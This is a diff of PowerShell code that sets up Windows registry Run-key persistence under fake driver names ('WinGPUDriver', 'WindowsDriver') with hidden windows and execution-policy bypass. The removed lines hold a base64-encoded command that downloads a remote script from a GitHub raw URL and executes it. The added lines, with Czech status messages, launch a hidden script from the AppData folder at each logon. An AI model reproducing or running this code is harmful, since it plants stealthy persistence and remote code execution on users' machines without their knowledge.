@@ -1,3 +1,15 @@
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
--Name "WinGPUDriver" `
--Value 'powershell.exe -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList ''-ExecutionPolicy Bypass -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSmlyaVdlaXNzL1ZlY3JhL21haW4vVmVjcmExLnBzMSIp'' -WindowStyle Hidden"'
+$scriptPath = "$env:APPDATA\SchedTas.ps1"
+>> $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+>> $regName = "WindowsDriver"
+>>
+>> try {
+>>     Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+>>     $check = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+>>     if ($check.$regName) {
+>>         Write-Host "[+] Skript přidán do HKCU\Run."
+>>     } else {
+>>         Write-Host "[-] Nepodařilo se ověřit zápis do registru."
+>>     }
+>> } catch {
+>>     Write-Host "[-] Chyba při zápisu do registru: $_"
+>> }
